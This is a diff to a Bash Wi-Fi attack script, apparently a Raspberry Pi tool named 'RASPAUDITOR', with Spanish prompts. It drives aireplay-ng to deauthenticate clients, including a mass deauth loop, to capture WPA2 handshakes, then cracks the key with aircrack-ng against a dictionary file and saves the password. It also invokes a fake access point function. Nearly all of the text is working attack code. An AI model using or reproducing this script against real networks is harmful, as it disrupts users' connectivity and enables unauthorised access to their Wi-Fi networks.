@@ -9,6 +9,7 @@ path="$WDIR/"
 outFile="lista_redes"
 iFile="lista_redes-01.csv"
 redes="redes_disponibles"
+diccionarios="diccionarios/"
 
 aireplay_kill() {
     for pid in $(pgrep $(basename "$AIREPLAY")); do
@@ -39,8 +40,8 @@ fake_ap () {
 }
 
 brute_force() {
-    if [ "$(aircrack-ng -a2 -q -w /home/pi/scripts/dict.txt /home/pi/scripts/*.cap -b ${mac_red} |grep 'KEY FOUND!' &>/dev/null; echo $?)" == "0" ]; then
-        aircrack-ng -a2 -q -w /home/pi/scripts/dict.txt /home/pi/scripts/*.cap -b ${mac_red} | grep 'KEY FOUND!' | cut -d'[' -f2  | cut -d ']' -f1 > "$nombre_red"_password.txt
+    if [ "$(aircrack-ng -a2 -q -w "$path$diccionarios"dict.txt *.cap -b ${mac_red} |grep 'KEY FOUND!' &>/dev/null; echo $?)" == "0" ]; then
+        aircrack-ng -a2 -q -w "$path$diccionarios"dict.txt "$path"*.cap -b ${mac_red} | grep 'KEY FOUND!' | cut -d'[' -f2  | cut -d ']' -f1 > "$nombre_red"_password.txt
         echo -n -e "\e[92mClave encontrada:\e[0m "
         cat "$nombre_red"_password.txt
     else
@@ -74,16 +75,19 @@ canales2() {
     done
 }
 
-rm -f "$path$iFile"
-rm -f "$path$redes"
-rm -f "$path"routers
-rm -f "$path"*.cap
-rm -f "$path"wifi
-rm -f "$path"conectados
-rm -f "$path"escaneo
+temp_del() {
+    rm -f "$path$iFile"
+    rm -f "$path$redes"
+    rm -f "$path"routers
+    rm -f "$path"*.cap
+    rm -f "$path"wifi
+    rm -f "$path"conectados
+    rm -f "$path"escaneo
+    rm -f "$path"canales
+}
 
 echo -e "\n\e[94m###################################\e[0m"
-echo -e "\e[94m#####\e[0m   \e[1;33mA U D I T O R _ P I\e[0m   \e[94m#####\e[0m"
+echo -e "\e[94m####\e[0m   \e[1;33mR A S P A U D I T O R\e[0m   \e[94m####\e[0m"
 echo -e "\e[94m###################################\e[0m\n"
 
 # Elegir accion
@@ -119,14 +123,24 @@ comp_handshake() {
         if [ $opcion -eq 1 ]; then
             fake_ap
             echo -e
+            temp_del
             exit 1
         else
             brute_force
             echo -e
+            temp_del
             exit 1
         fi
     else
         echo -e "\e[91mNo se ha podido obtener el handshake\e[0m\n"
+        read -p "Deseas volver a intentarlo? [y/n] " resp2
+        if [ "$resp2" == "y" ]; then
+            deauth
+            comp_handshake
+        else
+            airodump_kill
+            temp_del
+        fi
     fi
 }
 
@@ -140,6 +154,7 @@ if [ $opcion -eq 3 ]; then
     echo -e
     canales2
     canales
+    temp_del
     echo -e
     exit 1
 fi
@@ -171,6 +186,7 @@ sleep 5
 # Deautenticacion clientes
 m=1
 for j in $(tr -d ' ' < $path$iFile 2>/dev/null | awk '/Station/{y=1;next}y' | grep $mac_red | awk -F ',' '{print $1}' | sed '/^\s*$/d'); do
+    echo "Intentando deautenticar clientes conectados a $nombre_red"
     # Deautenticar
     echo "Probando con ${j}"
     for n in 1 2 3; do
@@ -187,14 +203,19 @@ echo -e "\e[91mNo se ha podido obtener el handshake\e[0m\n"
 
 read -p "Deseas probar con deautenticacion masiva? [y/n] " resp1
 
-if [ "$resp1" == "y" ]; then
-#    { "$AIRODUMP" -c $c --bssid $mac_red -w $path$nombre_red -o pcap $INTERFAZ &>/dev/null; } &
-#    sleep 10
+deauth(){
     { "$AIREPLAY" --deauth 0 -a $mac_red $INTERFAZ &>/dev/null & }
     sleep 2
     aireplay_kill
     sleep 8
+}
+
+if [ "$resp1" == "y" ]; then
+    deauth
     comp_handshake
+else
+    airodump_kill
+    temp_del
 fi
 
 
